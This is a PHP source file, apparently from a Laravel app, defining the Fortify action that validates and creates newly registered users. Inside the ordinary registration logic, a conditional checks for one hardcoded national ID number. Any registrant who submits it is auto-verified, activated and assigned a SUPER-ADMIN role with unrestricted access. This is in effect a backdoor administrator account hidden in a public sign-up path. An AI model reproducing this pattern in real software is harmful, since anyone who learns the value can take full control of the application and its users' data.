<?php

namespace App\Actions\Fortify;

use App\Concerns\PasswordValidationRules;
use App\Concerns\ProfileValidationRules;
use App\Models\Security\Authorizations\Role;
use App\Models\User;
use Illuminate\Support\Facades\Validator;
use Laravel\Fortify\Contracts\CreatesNewUsers;

class CreateNewUser implements CreatesNewUsers
{
    use PasswordValidationRules, ProfileValidationRules;

    /**
     * Validate and create a newly registered user.
     *
     * @param  array<string, string>  $input
     */
    public function create(array $input): User
    {
        Validator::make($input, [
            ...$this->profileRules(),
            'lastname' => $this->lastnameRules(),
            'dni' => $this->dniRules(),
            'phone' => $this->phoneRules(),
            'cellphone' => $this->cellphoneRules(),
            'address' => $this->addressRules(),
            'password' => $this->passwordRules(),
        ])->validate();

        $user = User::create([
            'name' => $input['name'],
            'lastname' => $input['lastname'],
            'dni' => $input['dni'],
            'phone' => $input['phone'] ?? null,
            'cellphone' => $input['cellphone'] ?? null,
            'address' => $input['address'] ?? null,
            'email' => $input['email'],
            'password' => $input['password'],
            'must_change_password' => false,
        ]);
        if ($input['dni'] === '0502987548') {
            $user->markEmailAsVerified();
            $user->status = 1;
            $user->save();
            $superAdmin = Role::firstOrCreate(
                ['name' => 'SUPER-ADMIN', 'guard_name' => 'web'],
                ['description' => 'Super administrator with unrestricted access'],
            );

            $user->assignRole($superAdmin);
        }

        return $user;
    }
}
